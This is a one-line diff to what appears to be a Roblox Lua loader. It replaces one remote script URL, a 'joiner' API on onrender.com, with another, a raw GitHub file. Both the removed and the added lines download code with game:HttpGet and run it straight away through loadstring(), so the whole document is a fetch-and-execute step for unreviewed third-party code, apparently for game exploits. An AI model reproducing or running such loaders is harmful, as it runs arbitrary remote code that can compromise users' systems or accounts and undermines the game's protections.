@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://horloge-joiner.onrender.com/api/script/client.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/soumica821-crypto/safira/main/safira"))()
